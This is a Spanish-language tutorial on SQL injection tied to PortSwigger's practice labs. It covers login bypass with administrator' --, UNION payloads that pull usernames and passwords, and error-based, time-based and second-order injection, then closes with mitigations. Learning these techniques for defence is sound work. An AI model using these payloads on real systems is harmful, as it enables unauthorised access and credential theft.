# Ejemplos Prácticos de Inyección SQLi

## Listar contenido oculto

Para seguir el laboratorio visitar [Portswigger](https://portswigger.net/web-security/all-labs)

Una forma común de probar la [SQLi](SQLi.md) es modificar una URL para extraer datos que normalmente estarían ocultos.

```url
https://web-security-academy.net/filter?category=Pets%27+OR+1=1--
```
**Explicación:**
- `%27` es la codificación URL de `'` (comilla simple).
- `OR 1=1` siempre se evalúa como verdadero.
- `--` comenta el resto de la consulta SQL, evitando errores.

---

## Evadir Login con *Bypass*
Un atacante puede omitir la autenticación proporcionando entradas manipuladas en un formulario de inicio de sesión.

```txt
Login:

Username: administrator' --
Password: lo_que_sea
```
**Explicación:**
- `' --` cierra la consulta y comenta la parte de la contraseña, permitiendo acceso sin necesidad de conocerla.
- Funciona si la consulta es:
  ```sql
  SELECT * FROM usuarios WHERE usuario = 'administrator' AND clave = 'lo_que_sea';
  ```
  Pero se transforma en:
  ```sql
  SELECT * FROM usuarios WHERE usuario = 'administrator' -- ' AND clave = 'lo_que_sea';
  ```

---

## Obtener cantidad de columnas para ataques UNION
Se necesita conocer el número de columnas en la tabla antes de usar `UNION`.

```sql
ORDER BY 1 --
ORDER BY 2 --
ORDER BY 3 --  (Aumentar hasta que ocurra un error)
```
**Explicación:**
- `ORDER BY n` ayuda a determinar el número de columnas disponibles en la consulta.

---

## Encontrar columnas con tipos de datos útiles

```sql
UNION SELECT NULL, NULL, 'texto' --
```
**Explicación:**
- Se prueba con `NULL` hasta encontrar una columna donde se puede inyectar texto.

---

## Extraer usuarios y contraseñas

```sql
UNION SELECT username, password FROM users --
```
**Explicación:**
- Se usa `UNION` para extraer datos de la tabla `users`.

---

## SQLi basada en errores
Algunas bases de datos devuelven mensajes de error útiles que pueden revelar información.

```sql
' AND 1=CAST((SELECT clave FROM usuarios LIMIT 1) AS INT) --
```
**Explicación:**
- Intenta forzar un error al castear `clave` como entero.
- Si ocurre un error, significa que la columna existe.

---

## SQLi basada en tiempo (Blind SQL Injection)
Si no se obtiene respuesta directa, se pueden usar retrasos de tiempo.

```sql
' OR IF(1=1, SLEEP(5), 0) --
```
**Explicación:**
- Si la consulta es vulnerable, el servidor tardará 5 segundos en responder.

---

## SQLi de Segundo Orden
Se inyecta un payload en un lugar que no se ejecuta inmediatamente, sino en otro proceso posterior.

1️. Registro de usuario con payload malicioso:
```txt
Nombre: hacker'; INSERT INTO logs (mensaje) VALUES ('ataque exitoso'); --
```
2️. Cuando un administrador revisa los registros, se ejecuta la inyección.

**Explicación:**
- El ataque se ejecuta en otro punto de la aplicación, no inmediatamente.

---

## Cómo mitigar estos ataques
Usar **consultas preparadas** con parámetros seguros:
```sql
SELECT * FROM usuarios WHERE usuario = ? AND clave = ?;
```

**Escapar y validar entradas** del usuario.
**Restringir privilegios** de las cuentas de base de datos.
Implementar **WAFs** y herramientas de detección de ataques.

---

**Conclusión:** Estos ejemplos muestran lo peligroso que puede ser SQLi si no se implementan medidas de seguridad adecuadas.
